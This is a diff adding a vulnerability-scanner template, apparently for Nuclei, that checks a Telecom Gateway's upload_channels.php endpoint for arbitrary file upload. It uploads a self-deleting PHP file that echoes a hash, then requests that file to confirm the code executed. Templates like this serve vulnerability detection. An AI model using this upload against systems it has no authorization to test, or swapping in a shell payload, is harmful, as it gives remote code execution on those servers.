@@ -1,0 +1,50 @@
+id: telecom-gateway-upload-channels-php-file-upload
+info:
+  name: Telecom Gateway upload_channels.php Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects an arbitrary file upload vulnerability in Telecom Gateway's upload_channels.php endpoint, allowing attackers to upload and execute PHP files.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/bak_manager/upload_channels.php"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
+    body: |-
+      ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.php"
+      Content-Type: text/plain
+      
+      <?php echo md5({{t1}});unlink(__FILE__);?>
+      ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"error\""
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/bak_manager/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
